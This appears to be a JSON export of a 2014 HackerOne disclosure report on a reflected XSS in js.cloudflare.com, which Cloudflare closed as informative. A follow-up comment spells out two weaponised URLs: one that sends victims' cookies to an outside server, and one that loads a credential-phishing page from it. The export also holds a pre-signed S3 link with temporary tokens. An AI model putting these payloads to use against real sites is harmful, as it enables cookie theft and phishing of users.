{"id":8920,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTIw","url":"https://hackerone.com/reports/8920","title":"XSS - http://js.cloudflare.com","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2014-04-22T02:12:15.676Z","submitted_at":"2014-04-22T02:12:15.676Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"dekeeu","url":"/dekeeu","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/R3xjM7QMCJQTy8byKLGxXwuY/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41,"url":"https://hackerone.com/cloudflare","handle":"cloudflare","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Cloudflare Vulnerability Disclosure","twitter_handle":"cloudflare","website":"https://www.cloudflare.com/disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2014-05-22T03:15:19.951Z","bug_reporter_agreed_on_going_public_at":"2014-05-14T21:47:28.548Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi.\r\n\r\nI want to report to you a Reflected XSS(cross site scripting) vulnerability that I found in Cloudflare web-application and in a considerable percent can affect the safety of the users . Generally, an \"attacker\" can use XSS to send a malicious script to an unsuspecting user. The end user's browser has no way to know that the script should not be trusted and will execute the script.\r\n\r\nThe link where you can see a PoC is: http://js.cloudflare.com/xss%22onload=%22alert%281%29\r\n\r\nSteps for reproduce this flaw: Open the link above in a web browser (I recommend Mozilla Firefox or Opera) and you can see that an alertbox will appear , so my javascript function was successfully executed.\r\n\r\nRegards,\r\nColtuneac Alexandru\r\n\r\n\r\n\r\n","vulnerability_information_html":"\u003cp\u003eHi.\u003c/p\u003e\n\n\u003cp\u003eI want to report to you a Reflected XSS(cross site scripting) vulnerability that I found in Cloudflare web-application and in a considerable percent can affect the safety of the users . Generally, an \u0026quot;attacker\u0026quot; can use XSS to send a malicious script to an unsuspecting user. The end user\u0026#39;s browser has no way to know that the script should not be trusted and will execute the script.\u003c/p\u003e\n\n\u003cp\u003eThe link where you can see a PoC is: \u003ca title=\"http://js.cloudflare.com/xss%22onload=%22alert%281%29\" href=\"/redirect?url=http%3A%2F%2Fjs.cloudflare.com%2Fxss%2522onload%3D%2522alert%25281%2529\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://js.cloudflare.com/xss%22onload=%22alert%281%29\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSteps for reproduce this flaw: Open the link above in a web browser (I recommend Mozilla Firefox or Opera) and you can see that an alertbox will appear , so my javascript function was successfully executed.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nColtuneac Alexandru\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":7169,"file_name":"poc21.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/007/169/1fe0d6d85731cbaa62b052fda66522bc94aa60be/poc21.png?response-content-disposition=attachment%3B%20filename%3D%22poc21.png%22%3B%20filename%2A%3DUTF-8%27%27poc21.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070709Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=424af0e3295fb591492d7ac5a0dee157b07b30542043440caeb75fb92cdd3cdd","file_size":1086664,"type":"image/png"}],"allow_singular_disclosure_at":"2014-05-22T03:15:05.255Z","allow_singular_disclosure_after":-208497123.99076292,"singular_disclosure_allowed":true,"vote_count":1,"voters":["sw33tlie"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":35611,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Based on your initial description, there do not appear to be any security implications as a direct result of this behavior. This is expected. There's no way to save that code for later execution, and there's no way to access any information you yourself didn't already have access to. \n\nIf you disagree, please reply with additional information describing your reasoning. Including a working proof-of-concept can be incredibly helpful in our assessment of these claims.","markdown_message":"\u003cp\u003eBased on your initial description, there do not appear to be any security implications as a direct result of this behavior. This is expected. There\u0026#39;s no way to save that code for later execution, and there\u0026#39;s no way to access any information you yourself didn\u0026#39;t already have access to. \u003c/p\u003e\n\n\u003cp\u003eIf you disagree, please reply with additional information describing your reasoning. Including a working proof-of-concept can be incredibly helpful in our assessment of these claims.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-22T03:15:05.458Z","updated_at":"2014-04-22T03:15:05.458Z","actor":{"username":"justin","cleared":false,"url":"/justin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/714/460ff848ebf95933694f8e6c967854da33ee949e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":35654,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"An xss attack allows an attacker to inject arbitrary javascript code in web pages through some vulnerable parameters with some xss vectors.  The malicious script that I've injected in that page, can access any cookies, session tokens, or other sensitive information retained by victim's browser and used with that site. The script can even rewrite the content of the HTML page.  \n\nYou can do a lot of stuff with this flaw but it is used most for stealing cookies or phishing users. Let's assume that I want to steal one user's cookies. First of all, I will make a cookie grabber script which will store users credentials on my server and after that I will insert it in the vulnerable page. The final link will be: \n\nhttp://js.cloudflare.com/%22%3E%3C%2Fiframe%3E%3Cscript%3Edocument.location.assign(%22http:%2F%2Fcode4free.com%2Ffz%2Fhome%2Fkie.php%3Fk=%22+document.cookie)%3C%2Fscript%3E\n\nNow, I can spread this link and collect cookies.\n\nAnother possibility is to create a phishing page which will be inserted in the vulnerable page and will make an user to re-login and send me his email and password. So, I've created a html page which will phish users credentials and store them on my server. The final link will be: \n\nhttp://js.cloudflare.com/%22%20height=%220%22%20width=%220%22%3E%3C%2Fiframe%3E%3Ciframe%20src=%2F%2Fcode4free.com%2Ffz%2Fhome%2Fhome.html%3E\n\nAfter an user will open this link , he will probably be tempted to login and at that moment I will obtain everything I want.\n\nRegards,\nAlex\n\n","markdown_message":"\u003cp\u003eAn xss attack allows an attacker to inject arbitrary javascript code in web pages through some vulnerable parameters with some xss vectors.  The malicious script that I\u0026#39;ve injected in that page, can access any cookies, session tokens, or other sensitive information retained by victim\u0026#39;s browser and used with that site. The script can even rewrite the content of the HTML page.  \u003c/p\u003e\n\n\u003cp\u003eYou can do a lot of stuff with this flaw but it is used most for stealing cookies or phishing users. Let\u0026#39;s assume that I want to steal one user\u0026#39;s cookies. First of all, I will make a cookie grabber script which will store users credentials on my server and after that I will insert it in the vulnerable page. The final link will be: \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://js.cloudflare.com/%22%3E%3C%2Fiframe%3E%3Cscript%3Edocument.location.assign(%22http:%2F%2Fcode4free.com%2Ffz%2Fhome%2Fkie.php%3Fk=%22+document.cookie)%3C%2Fscript%3E\" href=\"/redirect?url=http%3A%2F%2Fjs.cloudflare.com%2F%2522%253E%253C%252Fiframe%253E%253Cscript%253Edocument.location.assign%28%2522http%3A%252F%252Fcode4free.com%252Ffz%252Fhome%252Fkie.php%253Fk%3D%2522%2Bdocument.cookie%29%253C%252Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://js.cloudflare.com/%22%3E%3C%2Fiframe%3E%3Cscript%3Edocument.location.assign(%22http:%2F%2Fcode4free.com%2Ffz%2Fhome%2Fkie.php%3Fk=%22+document.cookie)%3C%2Fscript%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eNow, I can spread this link and collect cookies.\u003c/p\u003e\n\n\u003cp\u003eAnother possibility is to create a phishing page which will be inserted in the vulnerable page and will make an user to re-login and send me his email and password. So, I\u0026#39;ve created a html page which will phish users credentials and store them on my server. The final link will be: \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://js.cloudflare.com/%22%20height=%220%22%20width=%220%22%3E%3C%2Fiframe%3E%3Ciframe%20src=%2F%2Fcode4free.com%2Ffz%2Fhome%2Fhome.html%3E\" href=\"/redirect?url=http%3A%2F%2Fjs.cloudflare.com%2F%2522%2520height%3D%25220%2522%2520width%3D%25220%2522%253E%253C%252Fiframe%253E%253Ciframe%2520src%3D%252F%252Fcode4free.com%252Ffz%252Fhome%252Fhome.html%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://js.cloudflare.com/%22%20height=%220%22%20width=%220%22%3E%3C%2Fiframe%3E%3Ciframe%20src=%2F%2Fcode4free.com%2Ffz%2Fhome%2Fhome.html%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter an user will open this link , he will probably be tempted to login and at that moment I will obtain everything I want.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nAlex\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-22T04:42:37.424Z","updated_at":"2014-04-22T04:42:37.424Z","actor":{"username":"dekeeu","cleared":false,"url":"/dekeeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R3xjM7QMCJQTy8byKLGxXwuY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":38836,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi.\nI saw that this bug was fixed because the website has been changed and some functionalities were disabled. Can you tell me if it was valid ? Thanks .\n\nRegards,\nColtuneac Alexandru","markdown_message":"\u003cp\u003eHi.\u003cbr\u003e\nI saw that this bug was fixed because the website has been changed and some functionalities were disabled. Can you tell me if it was valid ? Thanks .\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nColtuneac Alexandru\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-25T20:33:15.770Z","updated_at":"2014-04-25T20:33:15.770Z","actor":{"username":"dekeeu","cleared":false,"url":"/dekeeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R3xjM7QMCJQTy8byKLGxXwuY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":51201,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-14T21:47:28.563Z","updated_at":"2014-05-14T21:47:28.563Z","actor":{"username":"dekeeu","cleared":false,"url":"/dekeeu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/R3xjM7QMCJQTy8byKLGxXwuY/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":55074,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-22T03:15:19.964Z","updated_at":"2014-05-22T03:15:19.964Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}